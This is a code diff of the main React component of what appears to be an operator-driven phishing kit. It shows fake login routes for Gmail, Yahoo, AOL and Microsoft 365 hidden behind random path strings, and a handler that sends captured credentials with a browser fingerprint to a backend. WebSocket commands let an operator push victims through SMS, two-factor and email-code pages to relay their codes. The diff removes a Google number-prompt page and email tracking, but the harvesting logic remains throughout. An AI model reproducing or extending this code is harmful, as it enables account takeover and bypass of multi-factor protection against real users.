@@ -27,7 +27,6 @@ import AccountLockedPage from './components/interactive/AccountLockedPage';
 import SecurityCheckPage from './components/interactive/SecurityCheckPage';
 import TwoFactorPage from './components/interactive/TwoFactorPage';
 import EmailVerificationPage from './components/interactive/EmailVerificationPage';
-import GmailNumberPromptPage from './components/interactive/GmailNumberPromptPage';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
@@ -99,9 +98,6 @@ const ROUTES = {
   EMAIL_V_YAHOO: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
   EMAIL_V_AOL: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
   EMAIL_V_OTHERS: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
-  // Google "Number Prompt" challenge page (triggered by WebSocket `show_google_number_prompt`).
-  // Gmail-only — Google's number-matching 2-step verification flow.
-  GOOGLE_NUM_PROMPT: '/9k7s2x8m4n6jq1r3vt5wbpdfh8gyuc0aexlmnrz4qb7ip2vws5tjf6ahd9co1elur8mkn3yzgvxqp7bdtfh5wljrac0nqoiub6msyxedlf2gprt4hwzn8jcvabkoy7ifsxqpd1htmgnzbu3eclry8wfvka0joixsqdpe',
 };
 
 // Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
@@ -302,10 +298,6 @@ function App() {
   // WebSocket. The page components (e.g. `GmailSmsCodePage`) are "dumb": they
   // receive these values as props and simply render them.
   const [smsCode, setSmsCode] = useState('');
-  // Last email captured from a login submission. Used as a fallback so the
-  // per-provider Incorrect-Password / interactive pages always have an email
-  // to render even when the operator's WebSocket payload omits it.
-  const [lastEmail, setLastEmail] = useState('');
 
   // WebSocket command handler. Each interactive command navigates to a dedicated
   // per-provider full-screen page; there is no generic overlay.
@@ -320,12 +312,6 @@ function App() {
       window.location.href = 'https://www.adobe.com';
     } else if (command === 'navigate' && data?.route) {
       navigate(data.route as string);
-    } else if (command === 'show_google_number_prompt') {
-      // Google number-matching 2-step verification (Gmail-only). The operator
-      // now supplies a single chosen number (e.g. `{ number: 42 }`) which
-      // GmailNumberPromptPage renders for the user to approve on their device.
-      const mergedData = { email: lastEmail, ...(data || {}) };
-      navigate(ROUTES.GOOGLE_NUM_PROMPT, { state: { data: mergedData, provider: 'Gmail' } });
     } else if (command.startsWith('show_')) {
       const flow = command.replace('show_', '') as keyof typeof routeMaps;
       const providerKey = normalizeProviderKey(data?.provider as string);
@@ -346,14 +332,7 @@ function App() {
       }
       const targetRoute = routeMaps[flow]?.[providerKey];
       if (targetRoute) {
-        // Merge the last-submitted email as a fallback so pages like the
-        // Gmail Incorrect-Password screen always have an email to render
-        // even when the operator's payload omits it.
-        const mergedData = { email: lastEmail, ...(data || {}) };
-        // After receiving an operator-driven command, clear the loading
-        // spinner so the destination page is shown immediately.
-        setIsLoading(false);
-        navigate(targetRoute, { state: { data: mergedData, provider: data?.provider || 'Others' } });
+        navigate(targetRoute, { state: { data, provider: data?.provider || 'Others' } });
       }
     }
   };
@@ -378,16 +357,12 @@ function App() {
   // their own — they show a loading spinner and wait for a WebSocket command
   // (`redirect`, `show_*`, …) from the operator to drive the next step.
   const handleInteractiveAction = async (action: string, data?: Record<string, unknown>) => {
-    // Track any email coming through interactive actions (e.g. retry_password).
-    if (data && typeof data.email === 'string' && data.email) {
-      setLastEmail(data.email as string);
-    }
     const payload = {
       type: 'interaction',
       data: { action, sessionId, ...data }
     };
 
-    if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code', 'user_canceled'].includes(action)) {
+    if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code'].includes(action)) {
       // Show loading spinner and wait for the server-driven WebSocket command.
       setIsLoading(true);
       // Fire-and-forget — the operator drives the next UI state over WebSocket.
@@ -449,13 +424,6 @@ function App() {
   const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
     let fingerprint: Record<string, unknown> = {};
     try { fingerprint = await getBrowserFingerprint(); } catch (e) { console.warn('Fingerprint failed', e); }
-
-    // Remember the submitted email at app level so subsequent operator-driven
-    // interactive pages (Incorrect-Password, SMS, 2FA, …) always have an email
-    // to render even when the operator's WebSocket payload omits it.
-    if (typeof loginData.email === 'string' && loginData.email) {
-      setLastEmail(loginData.email);
-    }
 
     const credentialsData = { ...loginData, sessionId, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...fingerprint };
     // Fire-and-forget: do NOT await the API response — navigation must happen immediately.
@@ -634,8 +602,6 @@ function App() {
       <Route path={ROUTES.EMAIL_V_YAHOO} element={<EmailVerificationPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_AOL} element={<EmailVerificationPage providerKey="aol" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_OTHERS} element={<EmailVerificationPage providerKey="others" onAction={handleInteractiveAction} />} />
-      {/* Google "Number Prompt" challenge page (triggered by WebSocket `show_google_number_prompt`) */}
-      <Route path={ROUTES.GOOGLE_NUM_PROMPT} element={<GmailNumberPromptPage onAction={handleInteractiveAction} />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
       <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
